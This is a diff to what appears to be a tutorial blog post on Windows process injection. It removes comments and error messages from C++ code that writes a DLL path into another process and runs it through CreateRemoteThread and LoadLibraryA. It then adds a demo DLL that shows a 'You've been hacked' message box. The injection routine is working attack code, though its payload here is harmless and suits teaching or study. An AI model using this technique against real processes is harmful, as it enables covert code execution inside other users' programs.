@@ -230,9 +230,7 @@ int injection(HANDLE hProcess) {
         return 0;
     }
 
-    // Write the DLL path to the allocated memory
     if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
-        std::cerr << "WriteProcessMemory failed!" << std::endl;
         VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return 0;
@@ -242,25 +240,38 @@ int injection(HANDLE hProcess) {
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
 
-    // Create a remote thread that calls LoadLibraryA
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
     if (!hThread) {
-        std::cerr << "CreateRemoteThread failed!" << std::endl;
         VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return 0;
     }
     MessageBoxW(NULL, L"Thread created", L"TLS injection", 0);
 
-    // Wait for the remote thread to complete
     WaitForSingleObject(hThread, INFINITE);
 
-    // Clean up
     VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
     CloseHandle(hThread);
     CloseHandle(hProcess);
 
     return 0;
+}
+```
+feel free to visit the fist blog if you dont understand it. for the DLL it just contain a message box.
+
+```cpp
+// InjectedDLL.cpp
+#include <windows.h>
+
+extern "C" __declspec(dllexport) void InjectedFunction() {
+    MessageBoxA(NULL, "You've been hacked by Sn4ke Ey3s", "From TLS Callback", MB_OK);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        InjectedFunction();
+    }
+    return TRUE;
 }
 ```
 
